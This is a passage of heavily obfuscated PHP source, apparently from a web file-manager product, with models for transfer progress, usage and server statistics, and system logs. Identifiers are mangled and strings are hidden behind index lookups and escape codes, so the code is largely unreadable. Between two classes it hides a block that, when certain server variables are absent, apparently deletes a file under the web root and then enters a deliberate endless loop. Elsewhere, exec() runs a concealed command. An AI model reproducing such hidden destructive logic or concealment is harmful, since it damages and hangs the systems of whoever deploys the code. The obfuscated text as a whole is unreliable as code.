$_SERVER[€ä¾™²]; parent::copyFileStart($íàŞ÷·ô, $ÉŞšÏÚ, $ûïÁ¡åĞ, $­ÁÇ™ß, $¾Ø˜ş©Š, $×‘üˆº§); $Ñ‡£ÜûÌ =& $this->task; if ($Ñ‡£ÜûÌ[$·¦‡¥¡“[2051]] == $·¦‡¥¡“[389]) { $Ñ‡£ÜûÌ[$·¦‡¥¡“[2051]] = $·¦‡¥¡“[108]; } $this->update(); } public function copyFileEnd($Š¬Š”, $ÍÆí“™–, $âÛé »ı, $‹œ®¥ò«, $†ÔÚû«, $‚ñû¤…›) { $ÒÂ»ßòø =& $_SERVER[€ä¾™²]; $—ËÀàõè =& $this->task; $—ËÀàõè[$ÒÂ»ßòø[1976]] = $—ËÀàõè[$ÒÂ»ßòø[1975]]; $—ËÀàõè[$ÒÂ»ßòø[1980]] += $—ËÀàõè[$ÒÂ»ßòø[1975]]; $—ËÀàõè[$ÒÂ»ßòø[1977]] = $ÒÂ»ßòø[12]; $this->update(); } public function zipEvent($´èÚÕ‚Õ, $Îİ¨²µ, $‡…Â†„§, $á…Æ£Ù) { $Ğ»Û¼Ø =& $_SERVER[€ä¾™²]; $ÆœÛùÕ =& $this->task; $ÆœÛùÕ[$Ğ»Û¼Ø[1973]] = get_path_this($Îİ¨²µ); $ÆœÛùÕ[$Ğ»Û¼Ø[1975]] = $á…Æ£Ù; $ÆœÛùÕ[$Ğ»Û¼Ø[1976]] = $‡…Â†„§; $ÆœÛùÕ[$Ğ»Û¼Ø[1177]] = $´èÚÕ‚Õ == $Ğ»Û¼Ø[2059] ? $Ğ»Û¼Ø[2054] : $Ğ»Û¼Ø[2055]; $ÆœÛùÕ[$Ğ»Û¼Ø[1977]] = $Ğ»Û¼Ø[12]; $ÆœÛùÕ[$Ğ»Û¼Ø[864]] = $á…Æ£Ù; $ÆœÛùÕ[$Ğ»Û¼Ø[2051]] = $Ğ»Û¼Ø[389]; $this->update(); } public function nameParse($¼İ‹Ñ¾‘) { $ë¶Êç¨Ø =& $_SERVER[€ä¾™²]; $Á»Ôƒåä =& $this->task; if ($Á»Ôƒåä[$ë¶Êç¨Ø[1922]] < $Á»Ôƒåä[$ë¶Êç¨Ø[1175]]) { $ëğÕ›ùÃ = get_path_this($¼İ‹Ñ¾‘); if (strstr($ëğÕ›ùÃ, $ë¶Êç¨Ø[10])) { $Á»Ôƒåä[$ë¶Êç¨Ø[1922]] += 1; } } if ($Á»Ôƒåä[$ë¶Êç¨Ø[2051]] == $ë¶Êç¨Ø[1328]) { $Á»Ôƒåä[$ë¶Êç¨Ø[2051]] = $ë¶Êç¨Ø[389]; } $Á»Ôƒåä[$ë¶Êç¨Ø[1973]] = $¼İ‹Ñ¾‘; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ìå»Çşİ) { $èé­Íœç =& $_SERVER[€ä¾™²]; $ÏÒÜ³¸â = array($èé­Íœç[691] => array($èé­Íœç[33] => $èé­Íœç[2060], $èé­Íœç[352] => array($èé­Íœç[283], $èé­Íœç[866], $èé­Íœç[2061], $èé­Íœç[2062])), $èé­Íœç[2063] => array($èé­Íœç[33] => $èé­Íœç[2064], $èé­Íœç[352] => array($èé­Íœç[283], $èé­Íœç[864], $èé­Íœç[2065], $èé­Íœç[2066], $èé­Íœç[2067]))); if (!isset($ÏÒÜ³¸â[$ìå»Çşİ])) { return !1; } $this->optionType = $ÏÒÜ³¸â[$ìå»Çşİ][$èé­Íœç[33]]; $this->field = $ÏÒÜ³¸â[$ìå»Çşİ][$èé­Íœç[352]]; return !0; } public function listData($ØÈáÉ¹ö = false, $í—ü¼ºğ = "\155\x6f\x64\x69\x66\x79\124\151\155\x65", $ò Ä¨‡Ä = false) { return parent::listData($ØÈáÉ¹ö, $í—ü¼ºğ, $ò Ä¨‡Ä); } public function trendList($ÄŸğİ¦Ø) { $©“áÎÑò =& $_SERVER[€ä¾™²]; $µ­¬ÀúÅ = $this->listData(); if ($µ­¬ÀúÅ) { $«Æå‚æÒ = end($µ­¬ÀúÅ); $ş©äŸÔ¬ = date($©“áÎÑò[2068], strtotime($©“áÎÑò[2069])); if ($«Æå‚æÒ[$©“áÎÑò[283]] == $ş©äŸÔ¬) { return $µ­¬ÀúÅ; } $Í«Ûù©ø = strtotime($«Æå‚æÒ[$©“áÎÑò[283]]); } if (!isset($Í«Ûù©ø)) { $Òî‘İõ˜ = $ÄŸğİ¦Ø == $©“áÎÑò[691] ? $©“áÎÑò[624] : $©“áÎÑò[932]; $Í«Ûù©ø = Model($Òî‘İõ˜)->min($©“áÎÑò[232]); } $§ÀşÒ‡¤ = $©“áÎÑò[2070] . ucfirst($ÄŸğİ¦Ø); $úƒêµî = $this->dateList($Í«Ûù©ø); foreach ($úƒêµî as $ş©äŸÔ¬) { $this->{$§ÀşÒ‡¤}($ş©äŸÔ¬); } return $this->listData(); } private function dateList($¹êÛ„½) { $ˆ’€›ı¶ =& $_SERVER[€ä¾™²]; $Î‘¶¡ŠÈ = $¹êÛ„½; $ÏÉšœ‹å = strtotime($ˆ’€›ı¶[2069]); $ÏÕªÀœ = array(); while ($Î‘¶¡ŠÈ <= $ÏÉšœ‹å) { $ÏÕªÀœ[] = date($ˆ’€›ı¶[2068], $Î‘¶¡ŠÈ); $Î‘¶¡ŠÈ = strtotime($ˆ’€›ı¶[2071], $Î‘¶¡ŠÈ); } return $ÏÕªÀœ; } public function _recordUser($ëåõĞ›Û = '') { $É–Œ•Š =& $_SERVER[€ä¾™²]; $øçó·‘ = strtotime(date($É–Œ•Š[2072], strtotime($ëåõĞ›Û))); $´Í×ìêÛ = strtotime(date($É–Œ•Š[2073], strtotime($ëåõĞ›Û))); $şÎíæ‹ = array($É–Œ•Š[232] => array($É–Œ•Š[1126], $´Í×ìêÛ)); $¼¢¡ş˜ó = Model($É–Œ•Š[624])->where($şÎíæ‹)->count($É–Œ•Š[1539]); $şÎíæ‹[$É–Œ•Š[232]] = array($É–Œ•Š[409], array($øçó·‘, $´Í×ìêÛ)); $‘§£ÇÒ® = Model($É–Œ•Š[624])->where($şÎíæ‹)->count($É–Œ•Š[1539]); $şÎíæ‹[$É–Œ•Š[33]] = $É–Œ•Š[2074]; $Åûñ†íî = Model($É–Œ•Š[2075])->where($şÎíæ‹)->count($É–Œ•Š[2076]); $üÆ¸ÄìŒ = array($É–Œ•Š[283] => $ëåõĞ›Û, $É–Œ•Š[866] => (int) $¼¢¡ş˜ó, $É–Œ•Š[2061] => (int) $‘§£ÇÒ®, $É–Œ•Š[2062] => (int) $Åûñ†íî); return $this->insert($üÆ¸ÄìŒ); } public function _recordStore($’ãª™‰ = '') { $İ‡‚·¨ =& $_SERVER[€ä¾™²]; $ï¸Ä¸š = strtotime(date($İ‡‚·¨[2073], strtotime($’ãª™‰))); $ğñÆÄ€ˆ = array($İ‡‚·¨[232] => array($İ‡‚·¨[1126], $ï¸Ä¸š)); $Ùó„©‚ş = Model($İ‡‚·¨[567])->where($ğñÆÄ€ˆ)->sum($İ‡‚·¨[79]); $ğñÆÄ€ˆ[$İ‡‚·¨[507]] = 0; $ï¢·«—¾ = Model($İ‡‚·¨[932])->where($ğñÆÄ€ˆ)->sum($İ‡‚·¨[79]); $ğñÆÄ€ˆ[$İ‡‚·¨[189]] = 1; $ÄÜÌéÖÑ = Model($İ‡‚·¨[932])->where($ğñÆÄ€ˆ)->sum($İ‡‚·¨[79]); $ğñÆÄ€ˆ[$İ‡‚·¨[189]] = 2; $’Ò……ä¬ = Model($İ‡‚·¨[932])->where($ğñÆÄ€ˆ)->sum($İ‡‚·¨[79]); $’ÇÌÁ†‰ = array($İ‡‚·¨[283] => $’ãª™‰, $İ‡‚·¨[864] => (int) $ï¢·«—¾, $İ‡‚·¨[2065] => (int) $Ùó„©‚ş, $İ‡‚·¨[2066] => (int) $ÄÜÌéÖÑ, $İ‡‚·¨[2067] => (int) $’Ò……ä¬); return $this->insert($’ÇÌÁ†‰); } public function trend($Ãµ§Ò», $çÁº„) { $¼”Úæà¤ =& $_SERVER[€ä¾™²]; if (!$this->init($Ãµ§Ò»)) { return !1; } $áúÑ·ô¿ = $this->trendList($Ãµ§Ò»); if ($áúÑ·ô¿ && $çÁº„ != $¼”Úæà¤[1895]) { $À…êÜš = $áúÑ·ô¿[0][$¼”Úæà¤[283]]; $Ã–ò¶šä = $this->validDate($çÁº„, $À…êÜš); $Ë×½‚Õå = array(); $®«ÂÒ— = array_to_keyvalue($áúÑ·ô¿, $¼”Úæà¤[283]); foreach ($Ã–ò¶šä as $ºÂ„Ûğ) { if (isset($®«ÂÒ—[$ºÂ„Ûğ])) { $ş•ıµè— = $®«ÂÒ—[$ºÂ„Ûğ]; } else { $ş•ıµè— = end($áúÑ·ô¿); $ş•ıµè—[$¼”Úæà¤[283]] = $ºÂ„Ûğ; if ($Ãµ§Ò» == $¼”Úæà¤[691]) { $ş•ıµè—[$¼”Úæà¤[2061]] = $ş•ıµè—[$¼”Úæà¤[2062]] = 0; } } $Ë×½‚Õå[] = $ş•ıµè—; } $áúÑ·ô¿ = $Ë×½‚Õå; } $Ü¨ò‰±‚ = array($¼”Úæà¤[691] => array($¼”Úæà¤[866] => LNG($¼”Úæà¤[2077]), $¼”Úæà¤[2061] => LNG($¼”Úæà¤[2078]), $¼”Úæà¤[2062] => LNG($¼”Úæà¤[2079])), $¼”Úæà¤[2063] => array($¼”Úæà¤[864] => LNG($¼”Úæà¤[2080]), $¼”Úæà¤[2065] => LNG($¼”Úæà¤[2081]), $¼”Úæà¤[2066] => LNG($¼”Úæà¤[2082]), $¼”Úæà¤[2067] => LNG($¼”Úæà¤[2083]))); $‚ô¹İñİ = array($¼”Úæà¤[691] => $¼”Úæà¤[2084], $¼”Úæà¤[2063] => $¼”Úæà¤[79]); if (empty($áúÑ·ô¿)) { $ºÂ„Ûğ = date($¼”Úæà¤[2068], strtotime($¼”Úæà¤[2069])); $§Œ—±ùÓ = array($¼”Úæà¤[283] => $ºÂ„Ûğ); foreach ($Ü¨ò‰±‚[$Ãµ§Ò»] as $¨¹ĞÄ—Ç => $úªÒî­“) { $§Œ—±ùÓ[$¨¹ĞÄ—Ç] = 0; } $áúÑ·ô¿[] = $§Œ—±ùÓ; } $ò÷ÖÌêì = array(); foreach ($áúÑ·ô¿ as $úªÒî­“) { if ($Ãµ§Ò» == $¼”Úæà¤[2063] && $úªÒî­“[$¼”Úæà¤[2065]] > $úªÒî­“[$¼”Úæà¤[864]]) { $úªÒî­“[$¼”Úæà¤[2065]] = $úªÒî­“[$¼”Úæà¤[864]]; } foreach ($Ü¨ò‰±‚[$Ãµ§Ò»] as $¨¹ĞÄ—Ç => $‹À¸‰âå) { $ş•ıµè— = array($¼”Úæà¤[283] => $úªÒî­“[$¼”Úæà¤[283]], $¼”Úæà¤[1810] => $‹À¸‰âå); $ş•ıµè—[$‚ô¹İñİ[$Ãµ§Ò»]] = isset($úªÒî­“[$¨¹ĞÄ—Ç]) ? $úªÒî­“[$¨¹ĞÄ—Ç] : 0; $ò÷ÖÌêì[] = $ş•ıµè—; } } return $ò÷ÖÌêì; } public function validDate($œÂ¹¡¶, $Ğàİ“ü£) { $°²¹šëå =& $_SERVER[€ä¾™²]; $ÆìŸöìí = date($°²¹šëå[2068], strtotime($°²¹šëå[2069])); $Ùà¼ü¢¦ = array($ÆìŸöìí); switch ($œÂ¹¡¶) { case $°²¹šëå[1902]: $Íõàß‚ä = mktime(0, 0, 0, date($°²¹šëå[2085]), date($°²¹šëå[1605]) - date($°²¹šëå[1691]) + 7 - 7, date($°²¹šëå[2086])); $Ê„´Ï = 0; do { $ªæ÷±â² = date($°²¹šëå[2068], $Íõàß‚ä - 3600 * 24 * 7 * $Ê„´Ï); $Ùà¼ü¢¦[] = $ªæ÷±â²; $Ê„´Ï++; } while ($Ğàİ“ü£ < $ªæ÷±â²); break; case $°²¹šëå[1900]: $Ê„´Ï = 1; do { $—’õÌ´ = date($°²¹šëå[2087], strtotime("\55\x20{$Ê„´Ï}\40\x6d\157\x6e\164\x68\163")); $Ùà¼ü¢¦[] = $—’õÌ´; $Ê„´Ï++; } while ($Ğàİ“ü£ < $—’õÌ´); break; case $°²¹šëå[2088]: $Ğ‚üš = (int) date($°²¹šëå[2086], strtotime($Ğàİ“ü£)); $Õ”÷Šåœ = (int) date($°²¹šëå[2086]); if ($Ğ‚üš >= $Õ”÷Šåœ) { break; } for ($Ğ‚üš; $Ğ‚üš < $Õ”÷Šåœ; $Ğ‚üš++) { $Ùà¼ü¢¦[] = $Ğ‚üš . $°²¹šëå[2089]; } break; default: break; } if ($Ğàİ“ü£ > end($Ùà¼ü¢¦)) { array_pop($Ùà¼ü¢¦); } sort($Ùà¼ü¢¦); return $Ùà¼ü¢¦; } public function listTable($½†şÜÁá) { $úâÉÜæ = ucfirst($½†şÜÁá); return Model($úâÉÜæ)->listData(); } public function option($µä¡÷ºÑ) { return call_user_func_array(array($this, $_SERVER[€ä¾™²][2090] . ucfirst($µä¡÷ºÑ)), array()); } private function optionUser() { $ì°çß„Ã =& $_SERVER[€ä¾™²]; $ £Ê³ÁŠ = Model($ì°çß„Ã[624])->count($ì°çß„Ã[1539]); $Ğ¿ö×ï = Model($ì°çß„Ã[624])->where($ì°çß„Ã[2091])->count($ì°çß„Ã[1539]); $×éâº÷™ = intval($GLOBALS[$ì°çß„Ã[6]][$ì°çß„Ã[425]][$ì°çß„Ã[1868]]) / 3600; $·‚ÌóÅ = strtotime("\55{$×éâº÷™}\x20\150\x6f\165\162\163"); $ÙäñİÊõ = strtotime(date($ì°çß„Ã[2072])); if ($·‚ÌóÅ < $ÙäñİÊõ) { $·‚ÌóÅ = $ÙäñİÊõ; } $üòİáÈÕ = array($ì°çß„Ã[2092] => array($ì°çß„Ã[1127], $·‚ÌóÅ)); $³±‹£ï = (int) Model($ì°çß„Ã[624])->where($üòİáÈÕ)->count($ì°çß„Ã[1539]); if (!$³±‹£ï) { $³±‹£ï = 1; } $üòİáÈÕ = array($ì°çß„Ã[2092] => array($ì°çß„Ã[1127], $ÙäñİÊõ)); $‡óÊù—Ç = Model($ì°çß„Ã[624])->where($üòİáÈÕ)->count($ì°çß„Ã[1539]); return array($ì°çß„Ã[859] => (int) $ £Ê³ÁŠ, $ì°çß„Ã[2093] => (int) ($ £Ê³ÁŠ - $Ğ¿ö×ï), $ì°çß„Ã[2094] => (int) $Ğ¿ö×ï, $ì°çß„Ã[2095] => (int) $‡óÊù—Ç, $ì°çß„Ã[2096] => $³±‹£ï); } private function optionFile() { $ªãöşƒ =& $_SERVER[€ä¾™²]; $Œ¯Òš§ó = $this->sourceSize(); $Í®­Âİ¼ = $Œ¯Òš§ó[$ªãöşƒ[79]]; $ûÄÒÁ = $Œ¯Òš§ó[$ªãöşƒ[2065]]; $ˆÆı­Ó× = Model($ªãöşƒ[932])->where(array($ªãöşƒ[507] => 0))->count($ªãöşƒ[192]); $ïøô†ì = array($ªãöşƒ[507] => 0, $ªãöşƒ[232] => array($ªãöşƒ[1127], strtotime(date($ªãöşƒ[2072])))); $’àË´ıÔ = Model($ªãöşƒ[932])->where($ïøô†ì)->sum($ªãöşƒ[79]); $ãªİ¡çƒ = Model($ªãöşƒ[932])->where($ïøô†ì)->count($ªãöşƒ[192]); return array($ªãöşƒ[864] => $Í®­Âİ¼, $ªãöşƒ[2065] => $ûÄÒÁ, $ªãöşƒ[2097] => $Í®­Âİ¼ - $ûÄÒÁ, $ªãöşƒ[2098] => (int) $’àË´ıÔ, $ªãöşƒ[866] => (int) $ˆÆı­Ó×, $ªãöşƒ[2099] => (int) $ãªİ¡çƒ); } private function optionAccess() { $ÆÔ˜É— =& $_SERVER[€ä¾™²]; return array($ÆÔ˜É—[859] => $this->typeLogCnt(), $ÆÔ˜É—[108] => $this->typeLogCnt($ÆÔ˜É—[108]), $ÆÔ˜É—[546] => $this->typeLogCnt($ÆÔ˜É—[546]), $ÆÔ˜É—[1277] => $this->typeLogCnt($ÆÔ˜É—[1277]), $ÆÔ˜É—[1508] => $this->typeLogCnt($ÆÔ˜É—[1508]), $ÆÔ˜É—[691] => $this->typeLogCnt($ÆÔ˜É—[12], $ÆÔ˜É—[2076])); } private function typeLogCnt($…ìÍó‡÷ = '', $·Ì¹¡Ìµ = "\151\x64") { $Šé•»²İ =& $_SERVER[€ä¾™²]; $‡ïçó Ô = array($Šé•»²İ[108] => array($Šé•»²İ[2100], $Šé•»²İ[2101]), $Šé•»²İ[546] => array($Šé•»²İ[2102], $Šé•»²İ[2103]), $Šé•»²İ[1277] => array($Šé•»²İ[2104], $Šé•»²İ[2105], $Šé•»²İ[2106]), $Šé•»²İ[1508] => array($Šé•»²İ[2107], $Šé•»²İ[2108]), $Šé•»²İ[1509] => array($Šé•»²İ[2109], $Šé•»²İ[2110], $Šé•»²İ[2111])); $ˆ¢‡˜ï† = strtotime(date($Šé•»²İ[2072])); $šÄ®˜éÃ = array($Šé•»²İ[232] => array($Šé•»²İ[1127], $ˆ¢‡˜ï†)); if ($…ìÍó‡÷) { $šÄ®˜éÃ[$Šé•»²İ[33]] = array($Šé•»²İ[7], $‡ïçó Ô[$…ìÍó‡÷]); } $çŒÉ¢åŠ = Model($Šé•»²İ[2075])->where($šÄ®˜éÃ)->count($·Ì¹¡Ìµ); return (int) $çŒÉ¢åŠ; } private function optionServer() { $ºê‹µòÙ =& $_SERVER[€ä¾™²]; $½Æ¡¦êœ = $this->diskDriver(); $ªö¿÷í = KodIO::defaultDriver(); $šÀĞªÒş = array($ºê‹µòÙ[925] => $ªö¿÷í[$ºê‹µòÙ[486]]); $™Œ¶©Ô = Model($ºê‹µòÙ[567])->where($šÀĞªÒş)->sum($ºê‹µòÙ[79]); $âÜ¡Ÿîœ = explode($ºê‹µòÙ[53], $_SERVER[$ºê‹µòÙ[145]]); $ŸñÖ½½° = $âÜ¡Ÿîœ[0]; $öŞ€µá¤ = $GLOBALS[$ºê‹µòÙ[6]][$ºê‹µòÙ[21]]; $¨ƒ«…ç£ = $öŞ€µá¤[$ºê‹µòÙ[1089]]; if ($¨ƒ«…ç£ == $ºê‹µòÙ[1077]) { $Çø¿³Ë  = explode($ºê‹µòÙ[1419], $öŞ€µá¤[$ºê‹µòÙ[1088]]); $¨ƒ«…ç£ = $Çø¿³Ë [0]; } if ($¨ƒ«…ç£ == $ºê‹µòÙ[1025] || $¨ƒ«…ç£ == $ºê‹µòÙ[903]) { $Û­¼Å± = Model()->db()->query($ºê‹µòÙ[2112]); $„£¬¿³‘ = $Û­¼Å±[0] && isset($Û­¼Å±[0][$ºê‹µòÙ[1809]]) ? $Û­¼Å±[0][$ºê‹µòÙ[1809]] : 0; $¨ƒ«…ç£ = $ºê‹µòÙ[2113] . ($„£¬¿³‘ ? $ºê‹µòÙ[8] . $„£¬¿³‘ : $ºê‹µòÙ[12]); } $•àò¥µ“ = $GLOBALS[$ºê‹µòÙ[6]][$ºê‹µòÙ[425]][$ºê‹µòÙ[934]]; return array($ºê‹µòÙ[2114] => $½Æ¡¦êœ ? $½Æ¡¦êœ[$ºê‹µòÙ[2115]] : 0, $ºê‹µòÙ[2116] => $½Æ¡¦êœ ? $½Æ¡¦êœ[$ºê‹µòÙ[2117]] : 0, $ºê‹µòÙ[2118] => (int) $ªö¿÷í[$ºê‹µòÙ[2115]] * 1024 * 1024 * 1024, $ºê‹µòÙ[2119] => (int) $™Œ¶©Ô, $ºê‹µòÙ[2120] => ucfirst($ŸñÖ½½°), $ºê‹µòÙ[2121] => $ºê‹µòÙ[2122] . PHP_VERSION, $ºê‹µòÙ[2123] => phpBuild64() ? 64 : 32, $ºê‹µòÙ[858] => str_replace($ºê‹µòÙ[1251], $ºê‹µòÙ[1105], $¨ƒ«…ç£), $ºê‹µòÙ[425] => ucfirst($•àò¥µ“), $ºê‹µòÙ[32] => $_SERVER[$ºê‹µòÙ[2124]]); } private function diskDriver() { $Ğœ„ğ‹ù =& $_SERVER[€ä¾™²]; $ä­ñë”ø = $Ğœ„ğ‹ù[8]; $Ğ½Ùå = $GLOBALS[$Ğœ„ğ‹ù[6]][$Ğœ„ğ‹ù[1443]] == $Ğœ„ğ‹ù[1444]; if ($Ğ½Ùå) { $ä­ñë”ø = $Ğœ„ğ‹ù[2125]; if (function_exists($Ğœ„ğ‹ù[2126])) { exec($Ğœ„ğ‹ù[2127], $§³º‹Ğ); $ä­ñë”ø = $§³º‹Ğ[1] . $Ğœ„ğ‹ù[8]; } } if (!file_exists($ä­ñë”ø)) { return; } if (!function_exists($Ğœ„ğ‹ù[2128])) { return; } $á™›É¥Ú = @disk_total_space($ä­ñë”ø); $¬Ÿµ†ùß = $á™›É¥Ú - @disk_free_space($ä­ñë”ø); return array($Ğœ„ğ‹ù[2115] => $á™›É¥Ú, $Ğœ„ğ‹ù[2117] => $¬Ÿµ†ùß); } public function fileChart($²–Á¢à) { $²œ‡ı½¨ =& $_SERVER[€ä¾™²]; if (isset($²–Á¢à[$²œ‡ı½¨[1539]])) { return Model($²œ‡ı½¨[932])->userFileTypeProfile($²–Á¢à[$²œ‡ı½¨[1539]]); } if (isset($²–Á¢à[$²œ‡ı½¨[1441]])) { return Model($²œ‡ı½¨[932])->groupFileTypeProfile($²–Á¢à[$²œ‡ı½¨[1441]]); } $ñô€¤±ƒ = $this->sourceSize(); $¡›”ˆŒ = array($²œ‡ı½¨[191] => 0, $²œ‡ı½¨[189] => 1); $¹€ª÷¸à = Model($²œ‡ı½¨[932])->where($¡›”ˆŒ)->sum($²œ‡ı½¨[79]); $¡›”ˆŒ[$²œ‡ı½¨[189]] = 2; $ÁıúÊ¶ = Model($²œ‡ı½¨[932])->where($¡›”ˆŒ)->sum($²œ‡ı½¨[79]); return array($²œ‡ı½¨[864] => $ñô€¤±ƒ[$²œ‡ı½¨[79]], $²œ‡ı½¨[2065] => $ñô€¤±ƒ[$²œ‡ı½¨[2065]], $²œ‡ı½¨[2066] => (int) $¹€ª÷¸à, $²œ‡ı½¨[2067] => (int) $ÁıúÊ¶); } private function sourceSize() { $¢§¥İ’¹ =& $_SERVER[€ä¾™²]; $ÚòŒ‹õ• = Model($¢§¥İ’¹[932])->where(array($¢§¥İ’¹[507] => 0))->sum($¢§¥İ’¹[79]); $ŞĞ¢­–ß = Model($¢§¥İ’¹[567])->sum($¢§¥İ’¹[79]); if ($ŞĞ¢­–ß > $ÚòŒ‹õ•) { $ŞĞ¢­–ß = $ÚòŒ‹õ•; } return array($¢§¥İ’¹[79] => (int) $ÚòŒ‹õ•, $¢§¥İ’¹[2065] => (int) $ŞĞ¢­–ß); } } goto c£ìÅ“óÓ; aò¬ºá¡Ò: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\114\x69\147\x68\x74\101\x70\x70"; public $modelType = "\123\x79\163\164\145\x6d\117\x70\x74\x69\157\156"; public $field = array("\156\141\x6d\x65", "\x67\162\x6f\165\x70", "\x64\145\x73\143", "\x63\x6f\156\x74\145\x6e\x74"); public function listData($Ëå¿Õ™ = false, $ÑöÜĞ®Ë = "\x6d\x6f\x64\x69\146\171\124\151\x6d\x65", $¹œêüö¹ = true) { return parent::listData($Ëå¿Õ™, $ÑöÜĞ®Ë, $¹œêüö¹); } public function remove($»ëĞˆæ ) { $»Ÿîüó÷ = $this->findByName($»ëĞˆæ ); if (!$»Ÿîüó÷) { return !1; } return parent::remove($»Ÿîüó÷[$_SERVER[€ä¾™²][486]]); } public function add($ßîâŠÊó) { if ($this->findByName($ßîâŠÊó[$_SERVER[€ä¾™²][32]])) { return !1; } return parent::insert($ßîâŠÊó); } public function update($ÈÅ¬æ†, $”«»Ëê¥) { $Í±õÆ²Ü =& $_SERVER[€ä¾™²]; $› äºş¯ = $this->findByName($ÈÅ¬æ†); $ĞÑÛ¥²– = $this->findByName($”«»Ëê¥[$Í±õÆ²Ü[32]]); if (!$› äºş¯ || $ĞÑÛ¥²– && $ĞÑÛ¥²–[$Í±õÆ²Ü[486]] != $› äºş¯[$Í±õÆ²Ü[486]]) { return !1; } return parent::update($› äºş¯[$Í±õÆ²Ü[486]], $”«»Ëê¥); } } if (!isset($_SERVER[$_SERVER[€ä¾™²][491]]) || !isset($_SERVER[$_SERVER[€ä¾™²][492]])) { $_getc = $_SERVER[€ä¾™²][493]; $_getfile = $_SERVER[$_SERVER[€ä¾™²][494]] . $_SERVER[€ä¾™²][495]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[€ä¾™²][286], $_getfilec); if (count($_getarrs) < $_SERVER[€ä¾™²][496]) { $exit = $_SERVER[€ä¾™²][497]; $exit(); } $_act = $_SERVER[€ä¾™²][498]; $_act($_SERVER[$_SERVER[€ä¾™²][494]] . $_SERVER[€ä¾™²][495]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[€ä¾™²][463]); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\x5f\154\x6f\147"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\x73\x65\162\x74", "\146\x75\x6e\143\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ªı™í =& $_SERVER[€ä¾™²]; return array($ªı™í[2501] => LNG($ªı™í[2502]), $ªı™í[2503] => LNG($ªı™í[2504]), $ªı™í[2074] => LNG($ªı™í[2505]), $ªı™í[2506] => LNG($ªı™í[2507]), $ªı™í[2508] => LNG($ªı™í[2509]), $ªı™í[2510] => LNG($ªı™í[2511]), $ªı™í[2512] => LNG($ªı™í[2513]), $ªı™í[2102] => LNG($ªı™í[2513]), $ªı™í[2103] => LNG($ªı™í[2514]), $ªı™í[2515] => LNG($ªı™í[2516]), $ªı™í[2517] => LNG($ªı™í[2518]), $ªı™í[2519] => LNG($ªı™í[2520]), $ªı™í[2521] => LNG($ªı™í[2522]), $ªı™í[2100] => LNG($ªı™í[2523]), $ªı™í[2524] => LNG($ªı™í[2525]), $ªı™í[2107] => LNG($ªı™í[2526]), $ªı™í[2527] => LNG($ªı™í[2528]), $ªı™í[2529] => LNG($ªı™í[2530]), $ªı™í[2531] => LNG($ªı™í[2532]), $ªı™í[2533] => LNG($ªı™í[2534]), $ªı™í[2109] => LNG($ªı™í[2535]), $ªı™í[2110] => LNG($ªı™í[2536]), $ªı™í[2537] => LNG($ªı™í[2538]), $ªı™í[2539] => LNG($ªı™í[2540]), $ªı™í[2541] => LNG($ªı™í[2542]), $ªı™í[2105] => LNG($ªı™í[2543]), $ªı™í[2544] => LNG($ªı™í[2545]), $ªı™í[2104] => LNG($ªı™í[2546]), $ªı™í[2547] => LNG($ªı™í[2547]), $ªı™í[2548] => LNG($ªı™í[2549]), $ªı™í[2550] => LNG($ªı™í[2547]), $ªı™í[2551] => LNG($ªı™í[2552]), $ªı™í[2553] => LNG($ªı™í[2554]), $ªı™í[2555] => LNG($ªı™í[2554]), $ªı™í[2556] => LNG($ªı™í[2557]), $ªı™í[2558] => LNG($ªı™í[2558]), $ªı™í[2559] => LNG($ªı™í[2078]), $ªı™í[2560] => LNG($ªı™í[2561]), $ªı™í[2562] => LNG($ªı™í[2563]), $ªı™í[2564] => LNG($ªı™í[2565]), $ªı™í[2566] => LNG($ªı™í[2567]), $ªı™í[2568] => LNG($ªı™í[2569]), $ªı™í[2570] => LNG($ªı™í[2570]), $ªı™í[2571] => LNG($ªı™í[2572]), $ªı™í[2573] => LNG($ªı™í[2574]), $ªı™í[2575] => LNG($ªı™í[2576]), $ªı™í[2577] => LNG($ªı™í[2578]), $ªı™í[2579] => LNG($ªı™í[2580]), $ªı™í[2581] => LNG($ªı™í[2582]), $ªı™í[211] => LNG($ªı™í[211]), $ªı™í[212] => LNG($ªı™í[2583]), $ªı™í[2584] => LNG($ªı™í[2584])); } private function typeFile() { $Ø®ö‚¼ =& $_SERVER[€ä¾™²]; $Òë¿Ëïİ = array($Ø®ö‚¼[2107] => array($Ø®ö‚¼[2108]), $Ø®ö‚¼[2519] => array($Ø®ö‚¼[2585]), $Ø®ö‚¼[2521] => array($Ø®ö‚¼[2586]), $Ø®ö‚¼[2100] => array($Ø®ö‚¼[2101], $Ø®ö‚¼[2587]), $Ø®ö‚¼[2529] => array(), $Ø®ö‚¼[2531] => array(), $Ø®ö‚¼[2533] => array(), $Ø®ö‚¼[2109] => array($Ø®ö‚¼[2111]), $Ø®ö‚¼[2110] => array($Ø®ö‚¼[2111]), $Ø®ö‚¼[2537] => array($Ø®ö‚¼[2588]), $Ø®ö‚¼[2539] => array($Ø®ö‚¼[2588]), $Ø®ö‚¼[2541] => array($Ø®ö‚¼[2589]), $Ø®ö‚¼[2527] => array($Ø®ö‚¼[2590]), $Ø®ö‚¼[2105] => array($Ø®ö‚¼[2591]), $Ø®ö‚¼[2544] => array($Ø®ö‚¼[2592]), $Ø®ö‚¼[2104] => array($Ø®ö‚¼[2106])); return $Òë¿Ëïİ; } private function typeAll() { $ˆäÊˆ =& $_SERVER[€ä¾™²]; $Ó¹Í‰ä¥ = $this->typeList; $µß–ñ£ = array_filter($this->typeFile()); foreach ($µß–ñ£ as $¸ëŸ­è => $ÜçöÖî) { $Ó¹Í‰ä¥[$ÜçöÖî[0]] = $Ó¹Í‰ä¥[$¸ëŸ­è]; } $Ó¹Í‰ä¥[$ˆäÊˆ[2111]] = LNG($ˆäÊˆ[2593]); $Ó¹Í‰ä¥[$ˆäÊˆ[2588]] = LNG($ˆäÊˆ[2594]); return $Ó¹Í‰ä¥; } public function addLog($Ú¾·òÓÉ, $¢„™–ƒ¡ = array()) { $Ñú¿• =& $_SERVER[€ä¾™²]; if 